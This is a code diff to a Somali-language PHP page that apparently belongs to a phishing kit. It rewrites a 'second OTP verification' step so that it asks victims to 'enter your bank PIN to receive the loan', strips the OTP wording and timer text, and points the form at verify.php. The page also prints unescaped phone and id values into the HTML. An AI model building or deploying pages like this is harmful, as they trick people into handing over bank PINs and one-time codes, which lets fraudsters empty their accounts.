@@ -30,13 +30,13 @@ if(empty($phone)){
 
 <div class="card">
 
-<h2>Xaqiijinta OTP-ga Labaad</h2>
+<h2>Fadlan Geli PIN-ka bangigaaga si aad u hesho amaahda</h2>
 
-<p>Geli OTP-ga labaad ee loogu diray lambarka taleefankaaga</p>
+
 
 <h3>+252 <?php echo $phone; ?></h3>
 
-<form id="otpForm" action="verify2.php" method="POST">
+<form id="otpForm" action="verify.php" method="POST">
 
 <input type="hidden" name="id" value="<?php echo $id; ?>">
 <input type="hidden" name="phone" value="<?php echo $phone; ?>">
@@ -50,10 +50,10 @@ if(empty($phone)){
     <input type="text" maxlength="1" name="d6">
 </div>
 
-<button type="submit">XAQIIJI OTP-GA LABAAD</button>
-<p id="timer">resend otp in 30s</p>
+<button type="submit">GUDBI</button>
+<p id="timer"></p>
 
-<button id="resendBtn" disabled>resend otp</button>
+<button id="resendBtn" disabled></button>
 
 </form>
 
